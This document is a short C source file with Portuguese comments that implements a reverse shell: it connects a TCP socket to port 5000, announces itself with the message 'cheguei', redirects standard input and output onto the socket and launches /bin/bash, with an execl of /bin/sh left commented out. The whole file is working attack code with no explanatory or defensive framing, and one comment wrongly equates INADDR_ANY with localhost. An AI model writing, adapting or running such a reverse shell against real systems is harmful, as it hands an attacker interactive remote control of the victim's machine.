#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>	    // for inet_ntoa
#include <unistd.h>	    // for close()


char buff[1000];
char *msg = "cheguei";
char *shell = "/bin/sh";

int main(void){
    
    // file descriptor que identifica o socket local
    int fSock = socket(AF_INET, SOCK_STREAM, 0);
    
    // escrutura que ira receber os parametros do servidor
    struct sockaddr_in dadosSv;
    dadosSv.sin_family = AF_INET;
    dadosSv.sin_port = htons(5000);
    dadosSv.sin_addr.s_addr = INADDR_ANY; // INADDR_ANY = localhost
    memset(&dadosSv.sin_zero, 0, sizeof(dadosSv.sin_zero));
    

    socklen_t tDadosSv= sizeof(dadosSv);

    if ((connect(fSock, (struct sockaddr *)&dadosSv, tDadosSv)) < 0)
	puts("erro ao conectar");

    send(fSock, msg, strlen(msg), 0);
    
    dup2(fSock, fileno(stdin));   // entrada padrao trocada pelo socket
    dup2(fSock, fileno(stdout));  // saida padrao trocada pelo socket
    system("/bin/bash");
    //execl(shell, "/bin/sh", (char*)0);

    return 0;
}

